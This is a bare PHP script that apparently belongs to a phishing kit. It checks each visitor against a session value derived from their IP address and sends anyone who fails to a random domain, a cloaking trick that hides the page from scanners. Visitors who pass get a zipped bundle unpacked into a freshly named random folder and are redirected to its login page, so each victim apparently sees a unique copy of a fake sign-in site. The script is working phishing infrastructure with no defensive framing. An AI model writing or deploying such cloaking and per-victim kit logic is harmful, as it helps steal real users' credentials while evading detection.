<?php 
session_start();
function generateRandomString($length = 4) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

$desse= 'https://'.generateRandomString().'.com/';


$ip_address = $_SERVER['REMOTE_ADDR'];



if(empty($_SESSION['checklg']) or $_SESSION['checklg']!=sha1($ip_address))
{
 header("Location: $desse");
 die();
} 
else
{
  session_start();
  error_reporting(E_ERROR | E_PARSE);

$zip = new ZipArchive; 

function crypto_rand_secure($min, $max)
{
    $range = $max - $min;
    if ($range < 1) return $min; // not so random...
    $log = ceil(log($range, 2));
    $bytes = (int) ($log / 8) + 1; // length in bytes
    $bits = (int) $log + 1; // length in bits
    $filter = (int) (1 << $bits) - 1; // set all lower bits to 1
    do {
        $rnd = hexdec(bin2hex(openssl_random_pseudo_bytes($bytes)));
        $rnd = $rnd & $filter; // discard irrelevant bits
    } while ($rnd > $range);
    return $min + $rnd;
}
function getToken($length)
{
    $token = "";
    $codeAlphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $codeAlphabet.= "abcdefghijklmnopqrstuvwxyz";
    $codeAlphabet.= "0123456789";
    $max = strlen($codeAlphabet); // edited

    for ($i=0; $i < $length; $i++) {
        $token .= $codeAlphabet[crypto_rand_secure(0, $max-1)];
    }

    return $token;
}
$bytes = getToken(20);
$_SESSION['mainurl'] = 'files/'.$bytes.'/';
$link = 'files/'.$bytes.'/web/index.php?p=login';
// Zip File Name 
if ($zip->open('IPPQOUJHF323AJD73KL.zip') === TRUE) { 
  
    // Unzip Path 
    $zip->extractTo('files/'.$bytes.'/'); 
    $zip->close(); 
    header("Location: $link");
        die();
} else { 
    echo 'Process failed'; 
} 
} 

?> 